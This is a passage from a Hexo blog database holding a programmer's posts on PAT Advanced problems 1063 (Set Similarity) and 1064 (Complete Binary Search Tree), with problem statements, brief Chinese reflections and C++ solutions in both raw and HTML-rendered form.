inN;\n\t\tans = (float)inN / allN;\n\t\tprintf(\"%.1f%%\\n\", ans * 100);\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1063","published":1,"updated":"2017-02-18T10:38:15.624Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0g002fhv18ryxugvqg","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1063.Set Similarity</p>\n<p>Given two sets of integers, the similarity of the sets is defined to be Nc/Nt*100%, where Nc is the number of distinct common numbers shared by the two sets, and Nt is the total number of distinct numbers in the two sets. Your job is to calculate the similarity of any given pair of sets.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case first gives a positive integer N (&lt;=50) which is the total number of sets. Then N lines follow, each gives a set with a positive M (&lt;=104) and followed by M integers in the range [0, 109]. After the input of sets, a positive integer K (&lt;=2000) is given, followed by K lines of queries. Each query gives a pair of set numbers (the sets are numbered from 1 to N). All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each query, print in one line the similarity of the sets, in the percentage form accurate up to 1 decimal place.</p>\n<p>Sample Input:<br>3<br>3 99 87 101<br>4 87 101 5 87<br>7 99 101 18 5 135 18 99<br>2<br>1 2<br>1 3</p>\n<p>Sample Output:<br>50.0%<br>33.3%</p>\n</blockquote>\n<p>学习了几点简单的优化吧：</p>\n<ul>\n<li><code>int</code>比<code>float</code>运算快</li>\n<li><code>scnaf</code>和<code>printf</code>比<code>cin</code>和<code>cout</code>运算快</li>\n<li>一段程序比多段程序运算快（是不是把编译时间算上去了？还是<code>call</code>是一个耗时的指令？）</li>\n</ul>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">5e1</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">set</span>&lt;<span class=\"keyword\">int</span>&gt; s[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> n, ni;</div><div class=\"line\"><span class=\"keyword\">int</span> a, b;</div><div class=\"line\"><span class=\"keyword\">int</span> x, o;</div><div class=\"line\"><span class=\"keyword\">int</span> inN = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> allN = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"built_in\">set</span>&lt;<span class=\"keyword\">int</span>&gt; ::iterator it;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;ni);</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (ni--)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t\ts[i].insert(x);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;o);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (o--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;a, &amp;b);</div><div class=\"line\">\t\tinN = <span class=\"number\">0</span>; allN = <span class=\"number\">0</span>; ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (it = s[a].begin(); it != s[a].end(); it++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (s[b].find(*it) != s[b].end())inN++;</div><div class=\"line\">\t\tallN = s[a].size() + s[b].size() - inN;</div><div class=\"line\">\t\tans = (<span class=\"keyword\">float</span>)inN / allN;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%.1f%%\\n\"</span>, ans * <span class=\"number\">100</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1063.Set Similarity</p>\n<p>Given two sets of integers, the similarity of the sets is defined to be Nc/Nt*100%, where Nc is the number of distinct common numbers shared by the two sets, and Nt is the total number of distinct numbers in the two sets. Your job is to calculate the similarity of any given pair of sets.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case first gives a positive integer N (&lt;=50) which is the total number of sets. Then N lines follow, each gives a set with a positive M (&lt;=104) and followed by M integers in the range [0, 109]. After the input of sets, a positive integer K (&lt;=2000) is given, followed by K lines of queries. Each query gives a pair of set numbers (the sets are numbered from 1 to N). All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each query, print in one line the similarity of the sets, in the percentage form accurate up to 1 decimal place.</p>\n<p>Sample Input:<br>3<br>3 99 87 101<br>4 87 101 5 87<br>7 99 101 18 5 135 18 99<br>2<br>1 2<br>1 3</p>\n<p>Sample Output:<br>50.0%<br>33.3%</p>\n</blockquote>\n<p>学习了几点简单的优化吧：</p>\n<ul>\n<li><code>int</code>比<code>float</code>运算快</li>\n<li><code>scnaf</code>和<code>printf</code>比<code>cin</code>和<code>cout</code>运算快</li>\n<li>一段程序比多段程序运算快（是不是把编译时间算上去了？还是<code>call</code>是一个耗时的指令？）</li>\n</ul>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">5e1</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">set</span>&lt;<span class=\"keyword\">int</span>&gt; s[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> n, ni;</div><div class=\"line\"><span class=\"keyword\">int</span> a, b;</div><div class=\"line\"><span class=\"keyword\">int</span> x, o;</div><div class=\"line\"><span class=\"keyword\">int</span> inN = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> allN = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"built_in\">set</span>&lt;<span class=\"keyword\">int</span>&gt; ::iterator it;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;ni);</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (ni--)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t\ts[i].insert(x);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;o);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (o--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;a, &amp;b);</div><div class=\"line\">\t\tinN = <span class=\"number\">0</span>; allN = <span class=\"number\">0</span>; ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (it = s[a].begin(); it != s[a].end(); it++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (s[b].find(*it) != s[b].end())inN++;</div><div class=\"line\">\t\tallN = s[a].size() + s[b].size() - inN;</div><div class=\"line\">\t\tans = (<span class=\"keyword\">float</span>)inN / allN;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%.1f%%\\n\"</span>, ans * <span class=\"number\">100</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1064","date":"2017-02-21T14:53:48.000Z","_content":"\n## Descripton\n\n> 1064.Complete Binary Search Tree\n\n> A Binary Search Tree (BST) is recursively defined as a binary tree which has the following properties:\n\n> The left subtree of a node contains only nodes with keys less than the node's key.\nThe right subtree of a node contains only nodes with keys greater than or equal to the node's key.\nBoth the left and right subtrees must also be binary search trees.\nA Complete Binary Tree (CBT) is a tree that is completely filled, with the possible exception of the bottom level, which is filled from left to right.\n\n> Now given a sequence of distinct non-negative integer keys, a unique BST can be constructed if it is required that the tree must also be a CBT. You are supposed to output the level order traversal sequence of this BST.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (<=1000). Then N distinct non-negative integer keys are given in the next line. All the numbers in a line are separated by a space and are no greater than 2000.\n\n> Output Specification:\n\n> For each test case, print in one line the level order traversal sequence of the corresponding complete binary search tree. All the numbers in a line must be separated by a space, and there must be no extra space at the end of the line.\n\n> Sample Input:\n10\n1 2 3 4 5 6 7 8 9 0\n\n> Sample Output:\n6 3 8 1 5 7 9 0 2 4\n\n先建完全二叉树，然后中序遍历存放数值，最后bfs输出。\n开心，好像一次过的情况变得多起来了~\n可是为什么我的代码这么丑啊QAQ\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e3 + 10;\n\nstruct t{\n\tint d;\n\tint l;\n\tint r;\n\tint flag = 0;\n}t[maxN];\n\nint n;\nint b[maxN];\nint k = 1;\n\nvoid inorder(int a)\n{\n\tif (t[a].flag)\n\t{\n\t\tinorder(t[a].l);\n\t\tt[a].d = b[k++];\n\t\tinorder(t[a].r);\n\t}\n}\n\nvoid bfs(int root)\n{\n\tqueue<int> q;\n\tq.push(root);\n\twhile (!q.empty())\n\t{\n\t\tif (t[t[q.front()].l].flag)\n\t\t\tq.push(t[q.front()].l);\n\t\tif (t[t[q.front()].r].flag)\n\t\t\tq.push(t[q.front()].r);\n\t\t(q.size() != 1) ? printf(\"%d \", t[q.front()].d) : printf(\"%d\\n\", t[q.front()].d);\n\t\tq.pop();\n\t}\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tfor (int i = 1; i <= n; i++)\n\t\tscanf(\"%d\", b+i);\n\tsort(b+1, b+n+1);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tt[i].flag = 1;\n\t\tif (n % 2 == 0 && i * 2 <= n)\n\t\t{\n\t\t\tif (i != n / 2)\n\t\t\t{\n\t\t\t\tt[i].l = i * 2;\n\t\t\t\tt[i].r = i * 2 + 1;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tt[i].l = i * 2;\n\t\t\t}\n\t\t}\n\t\tif (n % 2 == 1 && i * 2 + 1 <= n)\n\t\t{\n\t\t\tt[i].l = i * 2;\n\t\t\tt[i].r = i * 2 + 1;\n\t\t}\n\t}\n\tinorder(1);\n\tbfs(1);\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1064.md","raw":"---\ntitle: PAT advanced 1064\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-21 22:53:48\n---\n\n## Descripton\n\n> 1064.Complete Binary Search Tree\n\n> A Binary Search Tree (BST) is recursively defined as a binary tree which has the following properties:\n\n> The left subtree of a node contains only nodes with keys less than the node's key.\nThe right subtree of a node contains only nodes with keys greater than or equal to the node's key.\nBoth the left and right subtrees must also be binary search trees.\nA Complete Binary Tree (CBT) is a tree that is completely filled, with the possible exception of the bottom level, which is filled from left to right.\n\n> Now given a sequence of distinct non-negative integer keys, a unique BST can be constructed if it is required that the tree must also be a CBT. You are supposed to output the level order traversal sequence of this BST.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (<=1000). Then N distinct non-negative integer keys are given in the next line. All the numbers in a line are separated by a space and are no greater than 2000.\n\n> Output Specification:\n\n> For each test case, print in one line the level order traversal sequence of the corresponding complete binary search tree. All the numbers in a line must be separated by a space, and there must be no extra space at the end of the line.\n\n> Sample Input:\n10\n1 2 3 4 5 6 7 8 9 0\n\n> Sample Output:\n6 3 8 1 5 7 9 0 2 4\n\n先建完全二叉树，然后中序遍历存放数值，最后bfs输出。\n开心，好像一次过的情况变得多起来了~\n可是为什么我的代码这么丑啊QAQ\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e3 + 10;\n\nstruct t{\n\tint d;\n\tint l;\n\tint r;\n\tint flag = 0;\n}t[maxN];\n\nint n;\nint b[maxN];\nint k = 1;\n\nvoid inorder(int a)\n{\n\tif (t[a].flag)\n\t{\n\t\tinorder(t[a].l);\n\t\tt[a].d = b[k++];\n\t\tinorder(t[a].r);\n\t}\n}\n\nvoid bfs(int root)\n{\n\tqueue<int> q;\n\tq.push(root);\n\twhile (!q.empty())\n\t{\n\t\tif (t[t[q.front()].l].flag)\n\t\t\tq.push(t[q.front()].l);\n\t\tif (t[t[q.front()].r].flag)\n\t\t\tq.push(t[q.front()].r);\n\t\t(q.size() != 1) ? printf(\"%d \", t[q.front()].d) : printf(\"%d\\n\", t[q.front()].d);\n\t\tq.pop();\n\t}\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tfor (int i = 1; i <= n; i++)\n\t\tscanf(\"%d\", b+i);\n\tsort(b+1, b+n+1);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tt[i].flag = 1;\n\t\tif (n % 2 == 0 && i * 2 <= n)\n\t\t{\n\t\t\tif (i != n / 2)\n\t\t\t{\n\t\t\t\tt[i].l = i * 2;\n\t\t\t\tt[i].r = i * 2 + 1;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tt[i].l = i * 2;\n\t\t\t}\n\t\t}\n\t\tif (n % 2 == 1 && i * 2 + 1 <= n)\n\t\t{\n\t\t\tt[i].l = i * 2;\n\t\t\tt[i].r = i * 2 + 1;\n\t\t}\n\t}\n\tinorder(1);\n\tbfs(1);\n\treturn 0;\n}\n```","slug":"PAT-advanced-1064","published":1,"updated":"2017-02-21T14:58:50.005Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0j002hhv18i7rcnowt","content":"<h2 id=\"Descripton\"><a href=\"#Descripton\" class=\"headerlink\" title=\"Descripton\"></a>Descripton</h2><blockquote>\n<p>1064.Complete Binary Search Tree</p>\n<p>A Binary Search Tree (BST) is recursively defined as a binary tree which has the following properties:</p>\n<p>The left subtree of a node contains only nodes with keys less than the node’s key.<br>The right subtree of a node contains only nodes with keys greater than or equal to the node’s key.<br>Both the left and right subtrees must also be binary search trees.<br>A Complete Binary Tree (CBT) is a tree that is completely filled, with the possible exception of the bottom level, which is filled from left to right.</p>\n<p>Now given a sequence of distinct non-negative integer keys, a unique BST can be constructed if it is required that the tree must also be a CBT. You are supposed to output the level order traversal sequence of this BST.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=1000). Then N distinct non-negative integer keys are given in the next line. All the numbers in a line are separated by a space and are no greater than 2000.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in one line the level order traversal sequence of the corresponding complete binary search tree. All the numbers in a line must be separated by a space, and there must be no extra space at the end of the line.</p>\n<p>Sample Input:<br>10<br>1 2 3 4 5 6 7 8 9 0</p>\n<p>Sample Output:<br>6 3 8 1 5 7 9 0 2 4</p>\n</blockquote>\n<p>先建完全二叉树，然后中序遍历存放数值，最后bfs输出。<br>开心，好像一次过的情况变得多起来了~<br>可是为什么我的代码这么丑啊QAQ</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> t&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> d;</div><div class=\"line\">\t<span class=\"keyword\">int</span> l;</div><div class=\"line\">\t<span class=\"keyword\">int</span> r;</div><div class=\"line\">\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;t[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> b[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> k = <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inorder</span><span class=\"params\">(<span class=\"keyword\">int</span> a)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (t[a].flag)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tinorder(t[a].l);</div><div class=\"line\">\t\tt[a].d = b[k++];</div><div class=\"line\">\t\tinorder(t[a].r);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">bfs</span><span class=\"params\">(<span class=\"keyword\">int</span> root)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt; q;</div><div class=\"line\">\tq.push(root);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (!q.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (t[t[q.front()].l].flag)</div><div class=\"line\">\t\t\tq.push(t[q.front()].l);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (t[t[q.front()].r].flag)</div><div class=\"line\">\t\t\tq.push(t[q.front()].r);</div><div class=\"line\">\t\t(q.size() != <span class=\"number\">1</span>) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, t[q.front()].d) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, t[q.front()].d);</div><div class=\"line\">\t\tq.pop();</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, b+i);</div><div class=\"line\">\tsort(b+<span class=\"number\">1</span>, b+n+<span class=\"number\">1</span>);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tt[i].flag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (n % <span class=\"number\">2</span> == <span class=\"number\">0</span> &amp;&amp; i * <span class=\"number\">2</span> &lt;= n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (i != n / <span class=\"number\">2</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tt[i].l = i * <span class=\"number\">2</span>;</div><div class=\"line\">\t\t\t\tt[i].r = i * <span class=\"number\">2</span> + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tt[i].l = i * <span class=\"number\">2</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (n % <span class=\"number\">2</span> == <span class=\"number\">1</span> &amp;&amp; i * <span class=\"number\">2</span> + <span class=\"number\">1</span> &lt;= n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tt[i].l = i * <span class=\"number\">2</span>;</div><div class=\"line\">\t\t\tt[i].r = i * <span class=\"number\">2</span> + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tinorder(<span class=\"number\">1</span>);</div><div class=\"line\">\tbfs(<span class=\"number\">1</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Descripton\"><a href=\"#Descripton\" class=\"headerlink\" title=\"Descripton\"></a>Descripton</h2><blockquote>\n<p>1064.Complete Binary Search Tree</p>\n<p>A Binary Search Tree (BST) is recursively defined as a binary tree which has the following properties:</p>\n<p>The left subtree of a node contains only nodes with keys less than the node’s key.<br>The right subtree of a node contains only nodes with keys greater than or equal to the node’s key.<br>Both the left and right subtrees must also be binary search trees.<br>A Complete Binary Tree (CBT) is a tree that is completely filled, with the possible exception of the bottom level, which is filled from left to right.</p>\n<p>Now given a sequence of distinct non-negative integer keys, a unique BST can be constructed if it is required that the tree must also be a CBT. You are supposed to output the level order traversal sequence of this BST.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=1000). Then N distinct non-negative integer keys are given in the next line. All the numbers in a line are separated by a space and are no greater than 2000.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in one line the level order traversal sequence of the corresponding complete binary search tree. All the numbers in a line must be separated by a space, and there must be no extra space at the end of the line.</p>\n<p>Sample Input:<br>10<br>1 2 3 4 5 6 7 8 9 0</p>\n<p>Sample Output:<br>6 3 8 1 5 7 9 0 2 4</p>\n</blockquote>\n<p>先建完全二叉树，然后中序遍历存放数值，最后bfs输出。<br>开心，好像一次过的情况变得多起来了~<br>可是为什么我的代码这么丑啊QAQ</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div 